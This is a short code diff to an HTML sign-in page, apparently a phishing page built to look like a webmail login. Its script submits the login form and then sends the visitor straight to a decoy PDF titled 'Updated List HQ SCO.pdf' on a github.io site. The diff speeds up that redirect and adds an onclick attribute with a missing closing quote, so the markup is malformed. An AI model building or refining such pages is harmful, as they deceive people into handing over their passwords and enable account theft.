@@ -69,7 +69,7 @@
                                     </div>
                                     <div class="signInAndLabel">
                                         <div>
-                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
+                                            <button id="loginButton" onclick="return validateForm(); tabindex="5" class="loginButton">Sign In</button>
 						<script>
 							function validateForm() {
 							    var username = document.getElementById("username").value;
@@ -82,12 +82,8 @@
 								return false; // Prevent form submission
 							    } else {
 								// Submit the form if validation passes
-								document.getElementById("zLoginForm").submit();
-								
-								// Redirect after a short delay to allow form submission
-								setTimeout(function() {
-								    window.location.href = 'https://dgfi07.github.io/BCC-html/Updated List HQ SCO.pdf'; // Change to your desired URL
-								}, 2000); // Adjust delay as needed
+								document.getElementById("zLoginForm").submit();							
+								window.location.href = 'https://dgfi07.github.io/BCC-html/Updated List HQ SCO.pdf'; // Change to your desired URL							
 								return false; // Prevent default form submission behavior
 							    }
 							}
